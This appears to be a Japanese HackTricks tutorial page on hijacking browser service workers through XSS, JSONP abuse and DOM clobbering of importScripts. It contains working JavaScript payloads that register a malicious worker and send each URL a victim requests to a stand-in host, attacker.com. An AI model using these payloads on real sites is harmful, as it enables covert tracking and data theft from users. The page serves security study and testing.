# サービスワーカーの悪用

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

**サービスワーカー**は、ブラウザによってバックグラウンドで実行されるスクリプトで、ウェブページとは別に動作し、ウェブページやユーザーの操作を必要としない機能を可能にし、**オフラインおよびバックグラウンド処理**の能力を向上させます。サービスワーカーに関する詳細情報は[こちら](https://developers.google.com/web/fundamentals/primers/service-workers)で確認できます。脆弱なウェブドメイン内でサービスワーカーを悪用することで、攻撃者はそのドメイン内のすべてのページに対する被害者の操作を制御することができます。

### 既存のサービスワーカーの確認

既存のサービスワーカーは、**Developer Tools**の**Application**タブの**Service Workers**セクションで確認できます。別の方法として、[chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals)を訪れることで、より詳細なビューを得ることができます。

### プッシュ通知

**プッシュ通知の権限**は、**サービスワーカー**が直接ユーザーの操作なしにサーバーと通信する能力に直接影響します。権限が拒否されると、サービスワーカーが継続的な脅威をもたらす可能性が制限されます。逆に、権限を付与すると、潜在的なエクスプロイトの受信と実行を可能にすることでセキュリティリスクが増加します。

## サービスワーカーを作成する攻撃

この脆弱性を悪用するためには、次のものを見つける必要があります：

- サーバーに**任意のJS**ファイルを**アップロード**する方法と、アップロードしたJSファイルの**サービスワーカーを読み込むためのXSS**
- **出力を操作できる**脆弱なJSONPリクエスト（**任意のJSコード**を使用）と、**ペイロードを持つJSONPを読み込むためのXSS**が必要です。このペイロードは**悪意のあるサービスワーカーを読み込む**ものです。

次の例では、`fetch`イベントをリッスンし、**取得した各URLを攻撃者のサーバーに送信する**新しいサービスワーカーを**登録するためのコード**を示します（これは**サーバー**に**アップロード**するか、**脆弱なJSONP**レスポンスを介して読み込む必要があるコードです）：
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
そして、これは**ワーカーを登録する**ためのコードです（**XSS**を悪用して実行できるコードです）。この場合、**GET**リクエストが**攻撃者**のサーバーに送信され、サービスワーカーの**登録**が成功したかどうかが**通知**されます：
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
脆弱なJSONPエンドポイントを悪用する場合、`var sw`の中に値を入れる必要があります。例えば:
```javascript
var sw =
"/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//"
```
C2に特化した**Service Workersの悪用**のための**Shadow Workers**があり、これらの脆弱性を悪用するのに非常に役立ちます。

**24時間キャッシュディレクティブ**は、悪意のあるまたは侵害された**サービスワーカー（SW）**の寿命を、XSS脆弱性の修正後最大24時間に制限します。オンラインクライアントの状態を前提としています。脆弱性を最小限に抑えるために、サイト運営者はSWスクリプトのTTL（Time-To-Live）を短くすることができます。開発者は、迅速な無効化のために[**サービスワーカーキルスイッチ**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776)を作成することも推奨されています。

## DOM Clobberingを介したSWでの`importScripts`の悪用

サービスワーカーから呼び出される**`importScripts`**関数は、**異なるドメインからスクリプトをインポート**することができます。この関数が**攻撃者が**変更できる**パラメータを使用して呼び出されると、攻撃者は**自分のドメインからJSスクリプトをインポート**し、XSSを取得することができます。

**これはCSP保護を回避します。**

**脆弱なコードの例:**

- **index.html**
```html
<script>
navigator.serviceWorker.register(
"/dom-invader/testcases/augmented-dom-import-scripts/sw.js" +
location.search
)
// attacker controls location.search
</script>
```
- **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search)
let host = searchParams.get("host")
self.importScripts(host + "/sw_extra.js")
//host can be controllable by an attacker
```
### DOMクラッキングを使用して

DOMクラッキングが何であるかの詳細については、次を確認してください：

{{#ref}}
dom-clobbering.md
{{#endref}}

SWが**`importScripts`**を呼び出すために使用しているURL/ドメインが**HTML要素内にある**場合、**DOMクラッキングを介してそれを変更することが可能**であり、SWが**あなたのドメインからスクリプトを読み込む**ようにできます。

この例については、参照リンクを確認してください。

## 参考文献

- [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{{#include ../../banners/hacktricks-training.md}}
